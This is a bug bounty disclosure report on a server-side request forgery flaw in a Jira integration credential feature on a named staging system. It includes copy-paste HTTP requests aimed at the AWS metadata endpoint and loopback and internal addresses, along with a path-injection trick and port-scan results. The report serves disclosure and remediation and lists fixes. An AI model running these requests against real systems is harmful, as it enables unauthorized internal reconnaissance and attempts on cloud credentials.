# BUG-012: SSRF via attacker-controlled `host` in Jira automation credentials (CWE-918) — internal port/service scan demonstrated

**Status:** CONFIRMED (internal service scan + external full-read primitive). VRT-honest severity below.
**Severity recommendation:** **P3** — SSRF → *Internal Port Service Scan* (VRT: Server Security Misconfiguration / SSRF / Internal Port Service Scan). P2 *Internal Secrets Exposure* explicitly **not** achieved (IMDSv2 enforced; no internal content readback).
**Target:** `https://bugbounty1.qe.optrostaging.ai` — AuditBoard QE staging
**Reporter:** zeno0 (user 230), token header auth
**Discovered:** 2026-11-07, upgraded with internal-scan evidence 2026-11-08 (session v)

## Summary

An authenticated user can create an **Automation Credential** of type `jira` whose `data.host` is an **arbitrary URL** — no scheme, host or IP validation (link-local, loopback, RFC1918, external hosts all accepted verbatim). A backend Node/axios integration service (`integrations.qa.soxhubapp.com` fleet, `axios/1.20.0`) then issues server-side requests to that host during credential **update/verify**, **project listing** (`GET {host}/rest/api/3/project/search?startAt=0&maxResults=50`) and **webhook registration** (`POST {host}/rest/webhooks/1.0/webhook`).

Against an **attacker-controlled external host** the parsed Jira projects are returned to the client (full-read SSRF against external targets). Against **internal targets** the sink becomes a **port/service scanner**: remote HTTP status codes pass through as distinct `ApiError` classes (`401 Unauthorized`, `403 Forbidden`, `404 Not Found`, `429`), connection failures collapse to a generic `500`, and blackholed targets hang — three-state open/closed/filtered differentiation with service identification. `data.host` also accepts **arbitrary paths** (the fixed Jira suffix is appended by string concatenation, so any `?param=` in the host pushes the suffix into the query string), giving **GET requests to arbitrary paths on internal HTTP services**.

## VRT mapping (honest)

| VRT row | Status |
| --- | --- |
| P2 — Internal Secrets Exposure | **Not achieved**: AWS IMDS reachable but IMDSv2-enforced (tokenless GET → 401); no internal response bodies readable |
| P3 — Internal Data Exposure | **Not achieved**: response content never reflected (Jira-shape parser gate; errors persisted as generic `"Something went wrong."`) |
| **P3 — Internal Port Service Scan** | **Demonstrated** — see evidence table |
| P4 — Internal Presence / Port Scan Only | Subsumed by the P3 evidence |
| P5 — External SSRF | Full-read readback from attacker hosts demonstrated (base capability) |

## Internal scan evidence (P3 core)

Each row: `PUT /api/v1/automation_credentials/{id}` with `data.host` = target, then `GET /api/v1/ticketing/projects?credentialId={id}` (time = client-observed).

| Internal target | Result | Interpretation |
| --- | --- | --- |
| `http://127.0.0.1:3000/`, `http://localhost:3000/...` (paths: `/`, `/api/v1/users/me`, `/up`, `/api/v1/jira/credential/76/issues/X`) | **404 `ApiError` "Not Found" ~0.5 s** | **OPEN**: internal HTTP service on loopback :3000 answering on arbitrary paths |
| `http://169.254.169.254/latest/meta-data/` (+`/latest/meta-data/iam/security-credentials/`) | **401 `ApiError` "Unauthorized" ~0.5 s** | **AWS IMDS identified** (link-local metadata reached; IMDSv2 rejects tokenless GET) |
| `http://integrations.qa.soxhubapp.com/` (port 80) | **404 `ApiError` ~0.5 s** | integration service's own plaintext HTTP listener |
| `http://127.0.0.1:6379/`, `:8080/`, `:9000/`, `:9001/`, `:9002/` | generic `500` ~0.49 s | refused/closed (same class for non-HTTP banners) |
| `https://kubernetes.default.svc/version`, `http://metadata.google.internal/...`, `http://169.254.170.2/v2/` | generic `500` ~0.5 s | no cluster DNS / no GCP metadata / no ECS v2 → **EC2-instance-style topology** |
| `http://172.31.0.1/`, `http://10.255.255.1/` | request **hangs** (>60 s) | blackholed/filtered segments |

**Service identification:** two internal services are named, not just "open": **AWS IMDS** (identified by its 401-on-tokenless-GET semantics at 169.254.169.254) and the **AuditBoard integration service itself** (`integrations.qa.soxhubapp.com`, both :80 and :443). Loopback scan shows an additional HTTP service on `:3000` (unidentified — 404 on all probed paths) and closed ports elsewhere. Remote status passthrough (`4xx → ApiError` with matching detail) makes this a repeatable scanner, and `last_verified` on the credential record persists verification status (`{"results":[{"status":200}]}` on success) readable afterwards.

**Arbitrary-path GET on internal services:** the service builds the request by string concatenation, so `data.host = http://localhost:3000/api/v1/users/me?zx=` produces `GET http://localhost:3000/api/v1/users/me?zx=/rest/api/3/project/search?startAt=0&maxResults=50` — the fixed Jira path lands in the query string and **any internal path becomes reachable** (proven: distinct status classes returned per path). Webhook registration additionally gives **POST** to `{host}/rest/webhooks/1.0/webhook` with a JSON body the attacker partially controls (leaks `https://integrations.qa.soxhubapp.com/api/v1/jira/credential/{id}/issues/{issue.key}?instanceUrl=...` + event list).

## Reproduction (copy-paste)

### Step 1 — create a jira credential with an internal host

```
POST /api/v1/automation_credentials HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: <id>:<secret>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
Content-Type: application/json

{"automation_credential":{"name":"zx-ssrf-probe","handler_type":"jira","type":"jira","data":{"host":"http://169.254.169.254/latest/meta-data/","type":"jira","email":"attacker@example.com","apiToken":"ZxProbeToken123"}}}
```

Response 200: `{"automation_credentials":[{"id":<id>, ...}]}`

### Step 2 — trigger the server-side fetch and read the status class

```
GET /api/v1/ticketing/projects?credentialId=<id> HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: <id>:<secret>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
Accept: application/json
```

→ `401` `{"errors":[{"code":"ApiError","detail":"Unauthorized","source":{"pointer":"data/attributes/apiError"},"_growl":"Unauthorized"}]}` in ~0.5 s — **the integration service fetched AWS link-local metadata and relayed its status code.**

### Step 3 — repeat with other hosts (scanner behavior)

Same credential, `PUT /api/v1/automation_credentials/<id>` with a new `data` (update also triggers a server-side verify), then Step 2:

- `host: http://127.0.0.1:3000/` → `404 ApiError "Not Found"` (**open**)
- `host: http://127.0.0.1:6379/` → generic `500` (**closed/refused**)
- `host: http://integrations.qa.soxhubapp.com/` → `404 ApiError` (**open, service named**)
- `host: http://10.255.255.1/` → hang (**filtered**)

### Step 4 — external full-read (base capability)

Point `data.host` at an attacker server answering any GET with
`{"isLast":true,"values":[{"id":"10001","key":"ZXSSRF","name":"ZX SSRF Readback Project","avatarUrls":{},"self":"https://zx.example/jira"}],"self":"https://zx.example","total":1,"maxResults":50,"startAt":0}`
→ Step 2 returns `200 {"projects":[{"id":"10001","name":"ZX SSRF Readback Project","description":"ZXSSRF"}]}` — attacker content parsed and returned as application data. Server-side requests observed: `GET <host>/rest/api/3/project/search?startAt=0&maxResults=50` (UA `axios/1.20.0`), `POST <host>/rest/webhooks/1.0/webhook` (UA `node`).

## Impact

- **Internal port/service scan (VRT P3):** any authenticated user can enumerate open ports and identify services on the integration fleet's internal network — including the AWS metadata service (169.254.169.254) and the AuditBoard integration service itself — with arbitrary-path GET reachability and POST capability.
- **Network topology disclosure:** IMDS reachable + no k8s/GCP/ECS metadata fingerprints → EC2-instance-style deployment; blackhole differentials separate app-tier/security-group segments.
- **External full-read SSRF (VRT P5 external):** arbitrary URL fetch with parsed-content readback and no scheme/host validation.
- **Pivot material:** if any internal service ever emits Jira-shaped JSON (`{"values":[...]}`) or the parser gate loosens, external readback becomes internal readback; IMDSv2 is the current control preventing instance-credential theft.

## Constraints observed (stated honestly)

- No internal **content** readback: internal responses must parse as Jira `{"values":[...]}` to surface; all failure paths persist only generic text (`"Something went wrong."`) — no error-body leakage observed across 500/403/404/200-plain/200-non-Jira-JSON controls.
- IMDSv2 enforced — no instance credentials.
- Redirect-following (axios default) unverified: redirector hops (httpbin.org) returned 403 to the `axios/1.20.0` UA; alternate redirectors not accepted for internal targets. Not required for the scan capability (direct internal hosts + path injection suffice).
- RFC1918 app-tier targets tested were blackholed; no lateral movement into app/data tier demonstrated.

## Remediation suggestions

1. Validate `data.host` server-side at create/update: allowlist `https` scheme + vendor/customer ticketing domains; reject link-local (169.254.0.0/16, fd00:ec2::254), loopback, RFC1918, and metadata endpoints (resolve-then-check, rebinding-safe).
2. Run the integration service with no route to IMDS (egress-restricted subnet / IMDS hop limit) and an egress allowlist.
3. Return generic verification results; do not relay remote status codes into client-visible error classes (`ApiError` detail passthrough is the scanner oracle).
4. Restrict credential creation/update to admins where ticketing integrations are admin-managed.

## Tester artifacts (disclosure)

No delete route exists (`DELETE /api/v1/automation_credentials/{id}` → 404). Test credentials created: ids **61–64** (`t049e`/`t049f`), **67–76** (`t050a-zx-oracle`, hosts = webhook.site / httpbin / internal loopback — all inert), **76** additionally reused as the scanner probe (final host `http://localhost:3000/up?zx=`). ~40 similar artifacts from other testers already exist in this org (`ssrf-test`, `poc-imds`, `poc-redis`, `poc-k8s`, ...). Vendor should remove all.
